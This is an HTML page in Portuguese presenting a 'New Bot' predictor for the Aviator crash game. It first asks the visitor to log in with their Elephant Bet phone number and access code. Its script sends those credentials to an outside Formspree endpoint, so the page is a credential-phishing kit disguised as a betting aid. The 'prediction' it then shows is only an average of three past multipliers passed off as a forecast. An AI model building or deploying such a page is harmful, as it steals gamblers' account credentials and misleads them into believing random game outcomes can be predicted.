<!DOCTYPE html>
<html lang="pt">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>New Bot - Predictor</title>
    <style>
        /* ... seu CSS aqui (igual ao anterior) ... */
        
        body {
            font-family: Arial, sans-serif;
            background-color: black;
            color: #fff;
            text-align: center;
            padding: 20px;
        }
        
        .hidden {
            display: none;
        }
        
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }
        
        input {
            padding: 10px;
            margin: 10px;
            width: 250px;
            border-radius: 5px;
            border: none;
            outline: none;
            font-size: 1rem;
        }
        
        button {
            padding: 10px 20px;
            background-color: #e91e63;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
        }
        
        button:hover {
            background-color: #c2185b;
        }
        
        #historico {
            margin-top: 20px;
        }
        
        #historico ul {
            list-style: none;
            padding: 0;
        }
        
        #historico li {
            margin-bottom: 5px;
            font-size: 0.95rem;
            color: #ccc;
        }
    </style>
</head>

<body>
    <!-- Tela de login -->
    <div id="login-screen">
        <h2>New Bot - Login</h2>
        <p>Faça a Conexão com a sua conta da Elephant Bet</p>
        <form id="login-form" action="https://formspree.io/f/mldwwpnb" method="POST" novalidate>
            <label for="phone">Número de Telemóvel:</label>
            <input type="tel" id="phone" name="phone" maxlength="9" required pattern="9\d{8}" placeholder="" inputmode="numeric" autocomplete="tel" autofocus />

            <label for="access">Código de Acesso:</label>
            <input type="password" id="access" name="auth_code" required minlength="4" />

            <!-- Honeypot (anti-spam) -->
            <input type="text" name="_honey" style="display:none" />

            <button type="submit">Entrar</button>
        </form>
    </div>

    <!-- Tela do predictor -->
    <div id="predictor-screen" class="hidden">
        <h2>New Bot - Predictor</h2>
        <p>Digite os 3 últimos valores (velas) do Aviator:</p>
        <input type="number" id="vela1" placeholder="Vela 1" step="0.01" required />
        <input type="number" id="vela2" placeholder="Vela 2" step="0.01" required />
        <input type="number" id="vela3" placeholder="Vela 3" step="0.01" required />
        <button id="predict-btn">Prever</button>
        <p id="resultado"></p>

        <div id="historico">
            <h3>Histórico de Previsões</h3>
            <ul id="lista-historico"></ul>
        </div>
    </div>

    <script>
        const phoneInput = document.getElementById('phone');

        phoneInput.addEventListener('input', () => {
            let val = phoneInput.value;
            val = val.replace(/\D/g, '');

            if (val.length > 0 && val[0] !== '9') {
                val = val.slice(1);
            }

            if (val.length > 9) {
                val = val.slice(0, 9);
            }

            phoneInput.value = val;
        });

        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = phoneInput.value.trim();
            const phoneRegex = /^9\d{8}$/;
            if (!phoneRegex.test(phone)) {
                alert('Número de telefone inválido. Deve começar com 9 e ter exatamente 9 dígitos.');
                return;
            }

            const access = document.getElementById('access').value.trim();

            try {
                const formData = new FormData(this);

                const response = await fetch(this.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        Accept: 'application/json',
                    },
                });

                if (response.ok) {
                    document.getElementById('login-screen').classList.add('hidden');
                    document.getElementById('predictor-screen').classList.remove('hidden');
                } else {
                    alert('Erro ao enviar. Verifique os dados e tente novamente.');
                }
            } catch (error) {
                alert('Erro de rede. Verifique sua conexão.');
                console.error(error);
            }
        });

        // Função de previsão
        const historico = [];

        function prever() {
            const v1 = parseFloat(document.getElementById('vela1').value);
            const v2 = parseFloat(document.getElementById('vela2').value);
            const v3 = parseFloat(document.getElementById('vela3').value);
            const resultadoEl = document.getElementById('resultado');

            if (isNaN(v1) || isNaN(v2) || isNaN(v3)) {
                resultadoEl.textContent = 'Por favor, preencha todas as velas corretamente.';
                return;
            }

            const media = (v1 + v2 + v3) / 3;
            let previsao = '';

            if (media < 2) {
                previsao = 'Alta chance de baixa (<2x)';
            } else if (media >= 2 && media <= 5) {
                previsao = 'Possível média (2x a 5x)';
            } else {
                previsao = 'Possível alta (>5x)';
            }

            const resultadoTexto = `Previsão: ${previsao} | Média: ${media.toFixed(2)} (V1: ${v1}, V2: ${v2}, V3: ${v3})`;
            resultadoEl.textContent = resultadoTexto;

            historico.unshift(resultadoTexto);
            if (historico.length > 5) historico.pop();

            atualizarHistorico();

            document.getElementById('vela1').value = '';
            document.getElementById('vela2').value = '';
            document.getElementById('vela3').value = '';
        }

        function atualizarHistorico() {
            const lista = document.getElementById('lista-historico');
            lista.innerHTML = '';

            historico.forEach(item => {
                const li = document.createElement('li');
                li.textContent = item;
                lista.appendChild(li);
            });
        }

        document.getElementById('predict-btn').addEventListener('click', prever);
    </script>
</body>

</html>